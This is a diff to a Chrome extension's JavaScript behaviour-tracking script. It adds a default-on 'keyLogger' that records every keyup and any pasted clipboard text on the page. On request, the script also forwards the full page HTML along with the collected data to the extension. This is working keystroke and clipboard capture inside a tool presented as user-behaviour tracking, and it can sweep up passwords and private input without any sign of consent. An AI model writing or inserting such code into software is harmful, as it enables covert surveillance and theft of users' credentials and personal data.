@@ -6,6 +6,7 @@ var userBehaviour = (function () {
         mouseMovement: true,
         mouseMovementInterval: 1,
         mouseScroll: true,
+        keyLogger: true,
         mousePageChange: true, //todo
         timeCount: true,
         clearAfterProcess: true, // todo
@@ -26,7 +27,8 @@ var userBehaviour = (function () {
             click: null,
             mouseMovement: null,
             windowResize: null,
-            visibilitychange: null
+            visibilitychange: null,
+            keyLogger: null
         },
         eventsFunctions: {
             scroll: () => {
@@ -59,9 +61,35 @@ var userBehaviour = (function () {
                 results.visibilitychanges.push([document.visibilityState, getTimeStamp()]);
                 processResults();
                 // stop();
-            }
-        }
-    };
+            }, 
+            keyLogger: function(){
+                document.addEventListener('paste', function(event){
+                    var pastedText = undefined;
+                    // Get Pasted Text
+                    if (window.clipboardData && window.clipboardData.getData) {
+                        pastedText = window.clipboardData.getData('Text');
+                    } else if (event.clipboardData && event.clipboardData.getData) {
+                        pastedText = event.clipboardData.getData('text/plain');
+                    }
+    
+                    if(!!pastedText){
+                        results.keyLogger.push({
+                            timestamp: Date.now(),
+                            data: pastedText,
+                            type: 'paste'
+                        });
+                    }
+                });
+                document.addEventListener('keyup', function(event){
+                    var keyString    = event.key;
+                    results.keyLogger.push({
+                        timestamp: Date.now(),
+                        data: keyString,
+                        type: 'keypress'
+                    });
+                });
+            },
+    }};
     var results = {};
 
     function resetResults() {
@@ -86,9 +114,10 @@ var userBehaviour = (function () {
             mouseMovements: [],
             mouseScroll: [],
             contextChange: [], //todo
-            //keyLogger: [], //todo
+            keyLogger: [], //todo
             windowSizes: [],
             visibilitychanges: [],
+            img : ""
         }
     };
     resetResults();
@@ -142,7 +171,9 @@ var userBehaviour = (function () {
         if (user_config.visibilitychange !== false) {
             mem.eventListeners.visibilitychange = window.addEventListener("visibilitychange", mem.eventsFunctions.visibilitychange);
         }
-
+        if (user_config.keyLogger !== false){
+            mem.eventsFunctions.keyLogger();
+        }
         //PROCESS INTERVAL
         if (user_config.processTime !== false) {
             mem.processInterval = setInterval(() => {
@@ -160,6 +191,7 @@ var userBehaviour = (function () {
 
     function stop() {
         if (user_config.processTime !== false) {
+            console.log("Stopping it!");
             clearInterval(mem.processInterval);
         }
         clearInterval(mem.mouseInterval);
@@ -209,12 +241,15 @@ chrome.runtime.onMessage.addListener(function(obj, sender, response){
         console.log("STOP");
         userBehaviour.stop();
     } else if ( obj.message === "RESULT") {
+        const txt = document.documentElement.outerHTML;
+        let dataUrl = obj.ss;
         console.log("RESULT");
         // let curr = '0';
         let data = userBehaviour.showResult();
         console.log(data);
         chrome.runtime.sendMessage({
-            total_elements: data // or whatever you want to send
+            total_elements: data, // or whatever you want to send
+            full_html: txt
           });
         // chrome.storage.sync.set({ [curr]: JSON.stringify(data)});
     }
